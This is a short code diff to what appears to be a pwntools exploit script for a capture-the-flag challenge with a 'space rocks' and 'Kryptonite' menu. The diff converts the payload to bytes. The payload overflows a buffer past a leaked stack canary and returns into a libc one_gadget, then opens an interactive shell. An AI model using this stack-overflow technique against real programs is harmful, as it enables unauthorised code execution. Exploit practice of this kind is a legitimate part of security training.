@@ -67,9 +67,9 @@ constraints:
 '''
 one_gadget = libc_base + 0x4f365
 offset = 24
-payload = offset*'A'
+payload = offset*b'A'
 payload += p64(canary)
-payload += 8*'A'
+payload += 8*b'A'
 payload += p64(one_gadget)
 
 for i in range(7):
@@ -80,6 +80,6 @@ for i in range(7):
 	io.recvuntil('Red or Green Kryptonite?')
 	io.sendline(b'1')
 io.recvuntil('You have less than 20 space rocks! Are you sure you want to buy it?')
-io.sendline(payload.encode())
+io.sendline(payload)
 io.interactive()
 
